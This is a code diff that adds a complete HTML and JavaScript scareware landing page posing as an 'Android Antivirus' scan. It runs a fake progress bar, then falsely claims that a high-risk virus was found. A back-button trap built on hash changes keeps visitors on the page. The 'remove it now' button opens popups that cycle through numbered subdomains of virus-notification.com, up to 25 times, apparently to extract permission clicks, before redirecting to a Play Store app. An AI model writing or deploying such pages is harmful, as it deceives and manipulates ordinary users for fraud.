@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Scanning device!</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+        <link href="/assets/img/shield-icon.png?v=2" rel="icon" type="image/png" />
+        <link href="https://fonts.googleapis.com/css?family=Roboto:400,700" rel="stylesheet" type="text/css">
+        <link href="/assets/css/style.css" rel="stylesheet" type="text/css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressbar.js/1.0.1/progressbar.min.js"></script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+    </head>
+    <body>
+        <header>
+            <img src="/assets/img/shield-icon.png?v=2">
+            <span class="green">Android</span>
+            <span class="black">Antivirus</span>
+        </header>
+
+        <div id="step-1">
+            <span class="l-title">Scanning Device...</span>
+            <div id="progress-bar"></div>
+            <span class="l-info">
+                Please do not stop the scanning of your device for the best results!
+            </span>
+        </div>
+
+        <div id="step-2">
+            <div class="alert-container">
+                <div>
+                    <img src="/assets/img/warning.png">
+                    <div class="warning-message">
+                        High risk virus found on your device!
+                        <img src="/assets/img/alert.gif">
+                    </div>
+                </div>
+            </div>
+
+            <div class="container spaced">
+                <div class="no-box-sz">
+                    <a id="buttonAction">
+                        <span id="btnText">Click here to remove it now!</span>
+                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="16" height="16" viewBox="0 0 16 12">
+                            <path fill="#fff" d="M15.5 8l-7.5-7.5v4.5h-8v6h8v4.5z"></path>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+
+            <div class="container">
+                <h3 id="infoLanding">Click the button above to clean your device and stay protected.</h3>
+            </div>
+        </div>
+
+        <script>
+            // needs some more testing
+            var isLocal = location.href.indexOf('.dev') > -1;
+
+            if (!isLocal) {
+                window.location.hash = "stay";
+                window.location.hash = "back";
+                window.onhashchange = function() { window.location.hash = "stay"; };
+            }
+
+            function getParameterByName(name) {
+                name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+                var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
+                    results = regex.exec(location.search);
+
+                return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+            }
+
+            var animationTime = 5000;
+
+            var progress = new ProgressBar.SemiCircle('#progress-bar', {
+                strokeWidth: 4,
+                color: '#FFEA82',
+                trailColor: '#eee',
+                trailWidth: 1,
+                easing: 'easeInOut',
+                duration: animationTime,
+                svgStyle: null,
+                text: {
+                    value: '',
+                    alignToBottom: false
+                },
+                from: { color: '#0891DA' },
+                to: { color: '#76D76E' },
+                step: function (state, indicator) {
+                    indicator.path.setAttribute('stroke', state.color);
+                    var value = Math.round(indicator.value() * 100);
+                    if (value === 0) {
+                        indicator.setText('');
+                    } else {
+                        indicator.setText(value + '%');
+                    }
+
+                    indicator.text.style.color = state.color;
+                }
+            });
+
+            progress.animate(1);
+
+            setTimeout(function() {
+                document.title = 'Warning! Possible infection detected!';
+                $('#step-1').hide();
+                $('#step-2').fadeIn(300);
+            }, animationTime + 250);
+
+            var newWin;
+            var destination = "https://play.google.com/store/apps/details?id=com.antivirus&hl=en";
+            var domain = isLocal ? 'v-notifier.dev' : 'virus-notification.com';
+            var localCount = 0;
+            var maxRetryCount = isLocal ? 3 : 25;
+
+            (function() {
+                var eventUsed = false;
+                var eventType = (navigator.userAgent.indexOf('iPhone') === -1) ? 'click touchstart' : 'click';
+
+                $('#buttonAction').on(eventType, function(event) {
+                    if (event.type === 'touchstart') $('#buttonAction').off('click');
+                    if (eventUsed) return; eventUsed = true;
+
+                    if (localCount === 0) {
+                        localCount++;
+                        newWin = window.open('/allow');
+                    } else {
+                        localCount++;
+                        newWin = window.open('https://v' + localCount + '.' + domain + '/allow#shake');
+                    }
+
+                    // re-enable button after some time has passed
+                    setTimeout(function() {
+                        eventUsed = false;
+                    }, 5000);
+                });
+            })();
+            
+            var escapeToDestination = function() {
+                if (isLocal) {
+                    window.location.href = destination;
+                } else {
+                    window.location.replace(destination);
+                }
+
+                newWin.postMessage('close', '*');
+            };
+
+            window.addEventListener('message', function(e) {
+                if (e.data === 'escape') {
+                    escapeToDestination();
+                    return;
+                }
+                
+                var parts = e.data.split('.');
+                var subdomain = parts[0];
+                var retryCount = parseInt(subdomain.replace(/(http|https):\/\/v/g, '')) || 0;
+
+                if (retryCount < maxRetryCount) {
+                    retryCount++;
+                    localCount = retryCount;
+
+                    newWin.postMessage('no-beforeunload', '*');
+
+                    setTimeout(function() {
+                        newWin.location.href = 'https://v' + retryCount + '.' + domain + '/allow#shake';
+                    }, 150);
+                } else {
+                    escapeToDestination();
+                }
+            }, false);
+        </script>
+    </body>
+</html>
